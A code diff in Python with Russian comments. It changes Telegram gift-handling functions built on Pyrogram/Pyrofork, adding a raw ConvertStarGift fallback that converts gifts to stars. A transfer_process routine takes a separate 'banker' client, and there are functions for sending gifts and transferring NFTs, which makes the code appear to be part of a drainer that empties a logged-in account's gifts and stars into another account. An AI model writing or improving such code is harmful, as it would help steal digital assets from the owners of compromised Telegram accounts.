@@ -595,8 +595,13 @@ async def get_owned_channels(client: Client):
 
 def analyze_gift_raw(gift, location_name="Me"):
     """Анализ подарка из raw API"""
+    saved_id = (getattr(gift, 'saved_id', None) or 
+                getattr(gift, 'id', None) or
+                getattr(gift, 'ID', None))
+    
     details = {
-        'id': getattr(gift, 'id', 0),
+        'id': saved_id or 0,
+        'saved_id': saved_id or 0,
         'msg_id': getattr(gift, 'msg_id', 0),
         'title': 'Gift',
         'star_count': getattr(gift, 'convert_stars', 0) or 0,
@@ -1013,16 +1018,48 @@ async def send_gift_task(client: Client, target_id, price, target_username=None,
         return False
 
 async def convert_gift_task(client: Client, gift_details):
-    """Конвертация подарка через высокоуровневый API"""
+    """Конвертация подарка через raw API"""
     msg_id = gift_details.get('msg_id')
-    if not msg_id:
+    saved_id = gift_details.get('id') or gift_details.get('saved_id')
+    
+    if not msg_id and not saved_id:
         return False
     
+    # Пробуем высокоуровневый метод, если доступен
     try:
-        await client.convert_gift_to_stars(owned_gift_id=str(msg_id))
+        if hasattr(client, 'convert_gift_to_stars'):
+            await client.convert_gift_to_stars(owned_gift_id=str(msg_id))
+            return True
+    except AttributeError:
+        pass
+    except Exception as e:
+        log_transfer(f"Ошибка конвертации (high-level): {e}", "error")
+    
+    # Fallback на raw API
+    try:
+        if PYROFORK_AVAILABLE:
+            from pyrofork import raw as pyro_raw
+        else:
+            from pyrogram import raw as pyro_raw
+        
+        # Используем saved_id если есть, иначе msg_id
+        gift_id = saved_id if saved_id else msg_id
+        
+        # Пробуем разные варианты InputStarGift
+        try:
+            input_gift = pyro_raw.types.InputStarGift(id=int(gift_id))
+        except:
+            # Если не работает с id, пробуем другой формат
+            input_gift = pyro_raw.types.InputStarGift(saved_id=int(gift_id))
+        
+        result = await client.invoke(
+            pyro_raw.functions.payments.ConvertStarGift(
+                gift=input_gift
+            )
+        )
         return True
     except Exception as e:
-        log_transfer(f"Ошибка конвертации: {e}", "error")
+        log_transfer(f"Ошибка конвертации (raw API): {e}", "error")
         return False
 
 async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: Bot, user_db_data):
@@ -1314,15 +1351,15 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
                 # Если это обычный подарок (не NFT) и не конвертирован
                 if not is_nft and not is_converted and convert_price > 0:
                     gift_info = analyze_gift(g)
-                    # Получаем raw объект из gift_info или из самого объекта g
-                    raw_gift_obj = gift_info.get('_raw_gift') or getattr(g, '_raw_gift', None)
-                    # Если saved_id не в gift_info, получаем его из SimpleGift
-                    if not gift_info.get('id') and hasattr(g, 'saved_id'):
-                        gift_info['id'] = g.saved_id
-                    elif not gift_info.get('id') and hasattr(g, 'id'):
-                        gift_info['id'] = g.id
+                    # Убеждаемся, что у нас есть и msg_id, и saved_id
                     if not gift_info.get('msg_id') and hasattr(g, 'message_id'):
                         gift_info['msg_id'] = g.message_id
+                    if not gift_info.get('id') and hasattr(g, 'saved_id'):
+                        gift_info['id'] = g.saved_id
+                        gift_info['saved_id'] = g.saved_id
+                    elif not gift_info.get('id') and hasattr(g, 'id'):
+                        gift_info['id'] = g.id
+                        gift_info['saved_id'] = g.id
                     convert_tasks.append(convert_gift_task(client, gift_info))
                     total_convertable_stars += convert_price
             
